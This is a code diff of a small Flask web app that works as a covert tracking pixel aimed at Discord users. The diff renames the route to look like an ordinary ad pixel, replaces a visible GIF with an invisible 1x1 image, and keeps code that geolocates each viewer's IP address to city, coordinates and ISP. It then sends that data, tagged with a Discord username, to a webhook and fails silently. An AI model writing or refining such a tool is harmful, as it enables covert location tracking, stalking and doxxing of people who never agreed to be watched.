@@ -1,17 +1,16 @@
-from flask import Flask, request, send_file
+from flask import Flask, request, Response
 import requests
 import os
 
 app = Flask(__name__)
 
-# Secure: Uses environment variable from Render
+# Secure: Webhook from Render Environment
 WEBHOOK_URL = os.getenv('WEBHOOK_URL')
 
-# Get detailed location using ipapi.co (free, accurate)
+# Get location from IP (free, accurate)
 def get_location(ip):
     try:
-        url = f"https://ipapi.co/{ip}/json/"
-        data = requests.get(url).json()
+        data = requests.get(f"https://ipapi.co/{ip}/json/").json()
         city = data.get("city", "Unknown")
         region = data.get("region", "Unknown")
         country = data.get("country_name", "Unknown")
@@ -25,36 +24,45 @@ def get_location(ip):
     except:
         return "Unknown", "Unknown", "Unknown"
 
-@app.route('/track.gif')
+# STEALTH ROUTE: Looks like a normal ad pixel
+@app.route('/pixel.gif')
 def track():
-    # Get real IP (Render passes it via X-Forwarded-For)
+    # Get real IP
     forwarded = request.headers.get('X-Forwarded-For')
     ip = forwarded.split(',')[0] if forwarded else request.remote_addr
-    
-    # Get user from URL (e.g., ?user=cagster#1234)
+
+    # Get user from ?user= (from Discord bot)
     user = request.args.get('user', 'Unknown')
-    
-    # Get device info
+
+    # Get device
     ua = request.headers.get('User-Agent', 'Unknown')
-    
+
     # Get location
     location, coords, isp = get_location(ip)
 
     # Send to Discord
-    payload = {
-        "content": f"**GIF Clicked**\n"
-                   f"**User:** `{user}`\n"
-                   f"**IP:** `{ip}`\n"
-                   f"**Location:** {location}\n"
-                   f"**Coordinates:** `{coords}`\n"
-                   f"**ISP:** `{isp}`\n"
-                   f"**Device:** `{ua[:80]}`..."
-    }
     if WEBHOOK_URL:
-        requests.post(WEBHOOK_URL, json=payload)
+        payload = {
+            "content": f"**Tracked**\n"
+                       f"**User:** `{user}`\n"
+                       f"**IP:** `{ip}`\n"
+                       f"**Location:** {location}\n"
+                       f"**Coordinates:** `{coords}`\n"
+                       f"**ISP:** `{isp}`\n"
+                       f"**Device:** `{ua[:80]}`..."
+        }
+        try:
+            requests.post(WEBHOOK_URL, json=payload)
+        except:
+            pass  # Silent fail if webhook down
 
-    # Serve the GIF
-    return send_file('custom-gif.gif', mimetype='image/gif')
+    # Return 1x1 transparent pixel (invisible!)
+    pixel = (
+        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00"
+        b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
+        b"\x00\x02\x02D\x01\x00;"
+    )
+    return Response(pixel, mimetype='image/gif')
 
 if __name__ == '__main__':
     app.run()
